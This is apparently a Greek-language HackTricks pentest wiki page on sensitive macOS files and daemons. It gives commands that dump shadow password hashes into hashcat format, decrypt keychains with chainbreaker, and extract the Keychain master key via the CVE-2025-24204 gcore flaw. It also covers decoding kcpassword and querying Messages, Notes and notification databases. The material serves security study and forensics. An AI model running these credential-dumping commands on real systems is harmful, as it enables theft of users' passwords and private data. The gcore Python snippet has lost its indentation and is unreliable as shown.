# macOS Ευαίσθητες Τοποθεσίες & Ενδιαφέροντα Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Κωδικοί πρόσβασης

### Shadow Passwords

Το shadow password αποθηκεύεται μαζί με τη ρύθμιση του χρήστη σε plists που βρίσκονται στο **`/var/db/dslocal/nodes/Default/users/`**.\
Το ακόλουθο oneliner μπορεί να χρησιμοποιηθεί για να κάνει dump **όλων των πληροφοριών για τους χρήστες** (συμπεριλαμβανομένων των hash info):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ή [**αυτό**](https://github.com/octomagon/davegrohl.git) μπορούν να χρησιμοποιηθούν για να μετατρέψουν το hash σε **hashcat** **format**.

Μια εναλλακτική one-liner που θα κάνει dump τα creds όλων των non-service accounts σε hashcat format `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Ένας άλλος τρόπος για να αποκτήσεις το `ShadowHashData` ενός χρήστη είναι χρησιμοποιώντας `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Αυτό το αρχείο **χρησιμοποιείται μόνο** όταν το σύστημα βρίσκεται σε **single-user mode** (οπότε όχι πολύ συχνά).

### Keychain Dump

Σημείωσε ότι όταν χρησιμοποιείς το binary `security` για να **dump the passwords decrypted**, αρκετά prompts θα ζητήσουν από τον χρήστη να επιτρέψει αυτή την ενέργεια.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Στα σύγχρονα macOS τα πιο ενδιαφέροντα backing stores είναι συνήθως **`~/Library/Keychains/login.keychain-db`** και **`/Library/Keychains/System.keychain`**. Είναι αρχεία βασισμένα σε SQLite, αλλά η πρόσβαση σε plaintext εξακολουθεί να μεσολαβείται από το **`securityd`**: το να κλέψεις το raw DB σου δίνει κυρίως metadata και encrypted blobs, εκτός αν ανακτήσεις επίσης τον κωδικό του χρήστη, το `SystemKey`, ή ένα in-memory master key.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Βάσει αυτού του σχολίου [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) φαίνεται ότι αυτά τα tools δεν λειτουργούν πλέον στο Big Sur.

### Keychaindump Overview

Ένα tool με όνομα **keychaindump** έχει αναπτυχθεί για να εξάγει passwords από macOS keychains, αλλά αντιμετωπίζει περιορισμούς σε νεότερες εκδόσεις macOS όπως το Big Sur, όπως αναφέρεται σε μια [συζήτηση](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Η χρήση του **keychaindump** απαιτεί από τον attacker να αποκτήσει πρόσβαση και να κάνει privilege escalation σε **root**. Το tool εκμεταλλεύεται το γεγονός ότι το keychain είναι ξεκλείδωτο από προεπιλογή κατά το user login για ευκολία, επιτρέποντας σε applications να έχουν πρόσβαση σε αυτό χωρίς να απαιτείται επανειλημμένα ο κωδικός του χρήστη. Ωστόσο, αν ένας user επιλέξει να κλειδώνει το keychain του μετά από κάθε χρήση, το **keychaindump** γίνεται αναποτελεσματικό.

Το **Keychaindump** λειτουργεί στοχεύοντας μια συγκεκριμένη process που ονομάζεται **securityd**, η οποία περιγράφεται από την Apple ως daemon για authorization και cryptographic operations, κρίσιμη για την πρόσβαση στο keychain. Η διαδικασία εξαγωγής περιλαμβάνει τον εντοπισμό ενός **Master Key** που προέρχεται από το login password του χρήστη. Αυτό το key είναι απαραίτητο για την ανάγνωση του keychain file. Για να εντοπίσει το **Master Key**, το **keychaindump** σαρώνει το memory heap του **securityd** χρησιμοποιώντας την εντολή `vmmap`, αναζητώντας πιθανά keys μέσα σε περιοχές που έχουν επισημανθεί ως `MALLOC_TINY`. Η ακόλουθη εντολή χρησιμοποιείται για να επιθεωρήσει αυτές τις memory locations:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Αφού εντοπίσει πιθανά master keys, το **keychaindump** ψάχνει μέσα στα heaps για ένα συγκεκριμένο pattern (`0x0000000000000018`) που υποδεικνύει έναν υποψήφιο για το master key. Απαιτούνται επιπλέον βήματα, συμπεριλαμβανομένου του deobfuscation, για να χρησιμοποιηθεί αυτό το key, όπως περιγράφεται στο source code του **keychaindump**. Οι analysts που εστιάζουν σε αυτό το area θα πρέπει να σημειώσουν ότι τα κρίσιμα data για την αποκρυπτογράφηση του keychain αποθηκεύονται μέσα στη memory της διεργασίας **securityd**. Ένα example command για να τρέξετε το **keychaindump** είναι:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) μπορεί να χρησιμοποιηθεί για την εξαγωγή των ακόλουθων τύπων πληροφοριών από ένα OSX keychain με forensically sound τρόπο:

- Hashed Keychain password, κατάλληλο για cracking με [hashcat](https://hashcat.net/hashcat/) ή [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Με το password ξεκλειδώματος του keychain, ένα master key που έχει ληφθεί χρησιμοποιώντας [volafox](https://github.com/n0fate/volafox) ή [volatility](https://github.com/volatilityfoundation/volatility), ή ένα unlock file όπως το SystemKey, το Chainbreaker θα παρέχει επίσης plaintext passwords.

Χωρίς μία από αυτές τις μεθόδους ξεκλειδώματος του Keychain, το Chainbreaker θα εμφανίσει όλες τις άλλες διαθέσιμες πληροφορίες.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) with SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Απόσπαση κλειδιών keychain (με κωδικούς πρόσβασης) με memory dump**

[Ακολούθησε αυτά τα βήματα](../index.html#dumping-memory-with-osxpmem) για να πραγματοποιήσεις ένα **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using users password**

Αν γνωρίζεις τον κωδικό του χρήστη, μπορείς να τον χρησιμοποιήσεις για να **κάνεις dump και να αποκρυπτογραφήσεις keychains που ανήκουν στον χρήστη**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Κύριο κλειδί Keychain μέσω `gcore` entitlement (CVE-2025-24204)

Το macOS 15.0 (Sequoia) διέθεσε το `/usr/bin/gcore` με το entitlement **`com.apple.system-task-ports.read`**, οπότε οποιοσδήποτε τοπικός admin (ή κακόβουλο signed app) μπορούσε να κάνει dump **τη μνήμη οποιασδήποτε διεργασίας ακόμη και με ενεργό SIP/TCC**. Το dump του `securityd` leak-άρει το **Keychain master key** σε καθαρό κείμενο και σου επιτρέπει να αποκρυπτογραφήσεις το `login.keychain-db` χωρίς τον κωδικό του χρήστη.

**Γρήγορη αναπαραγωγή σε ευάλωτα builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) για να αποκρυπτογραφήσεις το login keychain. Η Apple αφαίρεσε το entitlement στο **macOS 15.3+**, οπότε αυτό λειτουργεί μόνο σε unpatched Sequoia builds ή σε συστήματα που κράτησαν το vulnerable binary.

### kcpassword

Το αρχείο **kcpassword** είναι ένα αρχείο που αποθηκεύει το **user’s login password**, αλλά μόνο αν ο system owner έχει **ενεργοποιήσει το automatic login**. Επομένως, ο χρήστης θα συνδέεται αυτόματα χωρίς να του ζητείται password (κάτι που δεν είναι πολύ secure).

Το password αποθηκεύεται στο αρχείο **`/etc/kcpassword`** xored με το key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Αν το users password είναι μεγαλύτερο από το key, το key θα επαναχρησιμοποιηθεί.\
Αυτό κάνει το password αρκετά εύκολο να ανακτηθεί, για παράδειγμα χρησιμοποιώντας scripts όπως [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Ειδοποιήσεις

Πριν το **Sequoia**, συνήθως μπορείς να βρεις το Notification Center store στο **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. Στο **Sequoia+** η Apple το μετέφερε στο TCC-protected group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Οι περισσότερες από τις ενδιαφέρουσες πληροφορίες αποθηκεύονται μέσα σε στήλες **blob**, οπότε θα χρειαστεί να εξαγάγεις αυτό το περιεχόμενο και να το μετατρέψεις σε κάτι αναγνώσιμο από άνθρωπο (`plutil -p -`, `strings`, ή έναν μικρό parser). Γρήγορα παραδείγματα triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Πρόσφατα ζητήματα απορρήτου (NotificationCenter DB)

- Στο macOS **14.7–15.1** η Apple αποθήκευε το περιεχόμενο των banners στο `db2/db` SQLite χωρίς σωστό redaction. Τα CVEs **CVE-2024-44292/44293/40838/54504** επέτρεπαν σε οποιονδήποτε τοπικό χρήστη να διαβάζει το notification text άλλων χρηστών απλώς ανοίγοντας το DB (χωρίς TCC prompt).
- Η Apple μετρίασε αυτό το πρόβλημα μεταφέροντας το DB στο `group.com.apple.usernoted` και προστατεύοντάς το με TCC σε νεότερα Sequoia builds, οπότε σε τρέχοντα συστήματα συνήθως χρειάζεσαι το σωστό user context ή ένα TCC bypass για να το διαβάσεις.
- Σε legacy endpoints, αν θέλεις να διατηρήσεις τα artefacts, αντέγραψε μαζί τα αρχεία `db`, `db-wal` και `db-shm` πριν από update ή reboot.

### Σημειώσεις

Οι χρήστες **notes** βρίσκονται στο `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Αν το one-liner παραπάνω είναι too noisy, κάνε export `ZICNOTEDATA.ZDATA`, gunzip it, και parse το protobuf: αυτό συνήθως είναι πιο reliable από το να τρέχεις `strings` απευθείας πάνω στο SQLite.

### Background Tasks / Login Items

Από το **Ventura**, τα user-approved login items και αρκετά background tasks παρακολουθούνται σε **BTM** stores όπως τα **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** και το versioned system cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Αυτά τα files είναι χρήσιμα για να identify γρήγορα persistence, helper tools, και ορισμένα MDM-managed background items:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Για την οπτική της persistence και τα εσωτερικά του BTM, δες [the auto-start locations page](../../macos-auto-start-locations.md#login-items) και [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).

## Preferences

Σε macOS τα preferences των apps βρίσκονται στο **`$HOME/Library/Preferences`** και σε iOS βρίσκονται στο `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Σε macOS το cli tool **`defaults`** μπορεί να χρησιμοποιηθεί για να **modify the Preferences file**.

Το **`/usr/sbin/cfprefsd`** διεκδικεί τα XPC services `com.apple.cfprefsd.daemon` και `com.apple.cfprefsd.agent` και μπορεί να κληθεί για να εκτελέσει ενέργειες όπως το modify preferences.

## OpenDirectory permissions.plist

Το αρχείο `/System/Library/OpenDirectory/permissions.plist` περιέχει permissions που εφαρμόζονται σε node attributes και προστατεύεται από SIP.\
Αυτό το αρχείο δίνει permissions σε συγκεκριμένους users με βάση το UUID (και όχι το uid), ώστε να μπορούν να κάνουν access σε συγκεκριμένες sensitive information όπως `ShadowHashData`, `HeimdalSRPKey` και `KerberosKeys` μεταξύ άλλων:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Ο κύριος daemon για τις notifications είναι το **`/usr/sbin/notifyd`**. Για να λαμβάνουν notifications, οι clients πρέπει να κάνουν register μέσω του `com.apple.system.notification_center` Mach port (έλεγξέ το με `sudo lsmp -p <pid notifyd>`). Ο daemon ρυθμίζεται με το αρχείο `/etc/notify.conf`.

Τα ονόματα που χρησιμοποιούνται για τις notifications είναι μοναδικές reverse DNS σημειογραφίες και όταν ένα notification σταλεί σε ένα από αυτά, ο/οι client(s) που έχουν δηλώσει ότι μπορούν να το χειριστούν θα το λάβουν.

Είναι δυνατό να κάνεις dump την τρέχουσα κατάσταση (και να δεις όλα τα ονόματα) στέλνοντας το signal SIGUSR2 στη διεργασία notifyd και διαβάζοντας το παραγόμενο αρχείο: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Το **Distributed Notification Center** του οποίου το κύριο binary είναι το **`/usr/sbin/distnoted`**, είναι ένας άλλος τρόπος για την αποστολή notifications. Εκθέτει ορισμένες XPC services και πραγματοποιεί κάποιον έλεγχο για να προσπαθήσει να επαληθεύσει clients.

### Apple Push Notifications (APN)

Σε αυτή την περίπτωση, οι applications μπορούν να κάνουν register για **topics**. Ο client θα δημιουργήσει ένα token επικοινωνώντας με τους Apple's servers μέσω του **`apsd`**.\
Στη συνέχεια, οι providers θα έχουν επίσης δημιουργήσει ένα token και θα μπορούν να συνδεθούν με τους Apple's servers για να στείλουν messages στους clients. Αυτά τα messages θα ληφθούν τοπικά από το **`apsd`**, το οποίο θα προωθήσει το notification στην application που το περιμένει.

Οι preferences βρίσκονται στο `/Library/Preferences/com.apple.apsd.plist`.

Υπάρχει μια τοπική database των messages που βρίσκεται στο macOS στο `/Library/Application\ Support/ApplePushService/aps.db` και στο iOS στο `/var/mobile/Library/ApplePushService`. Έχει 3 tables: `incoming_messages`, `outgoing_messages` και `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Είναι επίσης δυνατό να λάβετε πληροφορίες σχετικά με το daemon και τις συνδέσεις χρησιμοποιώντας:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

These are notifications that the user should see in the screen:

- **`CFUserNotification`**: These API provides a way to show in the screen a pop-up with a message.
- **The Bulletin Board**: This shows in iOS a banner that disappears and will be stored in the Notification Center.
- **`NSUserNotificationCenter`**: This is the iOS bulletin board in MacOS. On older macOS releases the database usually lives in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; on Sequoia+ it was moved to `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
